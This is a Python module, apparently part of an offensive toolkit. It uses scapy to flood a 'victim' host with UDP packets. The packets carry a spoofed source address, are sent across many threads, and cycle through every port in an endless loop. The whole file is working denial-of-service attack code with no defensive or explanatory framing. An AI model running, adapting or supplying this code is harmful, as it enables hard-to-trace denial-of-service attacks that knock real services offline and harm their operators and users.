from scapy.all import *
import threading
from func.spoof_addr import spoof_addr
import traceback

def UDPflood(victim,quiet,THREAD_COUNT,terminal):
    try:
        terminal.write('\n[+] Flooding '+victim+' with UDP packets ')
        all_threads = []
        tc = THREAD_COUNT
        for i in range(tc):
            t = threading.Thread(target=__flood_udp,args=(tc,i,victim,quiet,terminal))
            t.daemon = True
            t.start()
            all_threads.append(t)

        all_threads[0].join()
    except Exception as s:
        terminal.write('\n'+str(s))
        traceback.print_exc()

def __flood_udp(step,start,victim,quiet,terminal):
    try:
        spoofaddr = spoof_addr(terminal)
        while True:
            for port in range(start,65535,step):
                packet = IP(src=spoofaddr,dst=victim)/UDP(dport=port)
                send(packet,verbose=0)
                if not quiet:
                    terminal.write('\n[+] Packet send to port '+str(port)+" ID: "+str(packet.summary()))
    except Exception as s:
        terminal.write('\n'+str(s))
        traceback.print_exc()
